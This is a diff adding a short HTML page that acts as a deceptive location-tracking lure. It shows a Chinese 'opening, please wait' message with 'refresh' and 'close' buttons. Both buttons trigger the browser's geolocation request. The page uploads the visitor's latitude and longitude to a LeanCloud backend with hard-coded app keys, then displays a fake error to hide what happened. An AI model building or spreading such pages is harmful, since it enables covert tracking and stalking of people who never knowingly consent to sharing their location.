@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+    
+    <head>
+        <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.5.4.js">
+        </script>
+    </head>
+    
+    <body>
+        <p id="demo">
+            正在打开，请稍后
+        </p>
+        <button onclick="getLocation()">
+            刷新
+        </button>
+        <button onclick="getLocation()">
+            关闭
+        </button>
+        <script>
+            var x = document.getElementById("demo");
+            function getLocation() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(showPosition);
+                } else {
+                    x.innerHTML = "页面发生了错误，请刷新";
+                }
+            }
+            function showPosition(position) {
+                AV.initialize("u4mko83xiqw8ctdg89paxcnovxr859tasfzm4fdb5qmzcww2", "lt4wf6rna79qw47cx84ummhyqhs6aot8uu3i4opy6d4gylzd");
+                var AVLocation = AV.Object.extend("Location");
+                var avLocation = new AVLocation();
+                avLocation.save({
+                    "latitude": '' + position.coords.latitude,
+                    "longitude": '' + position.coords.longitude
+
+                },
+                {
+                    success: function(object) {
+                        x.innerHTML = "页面发生了错误，请刷新";
+                    }
+                });
+            }
+        </script>
+    </body>
+
+</html>
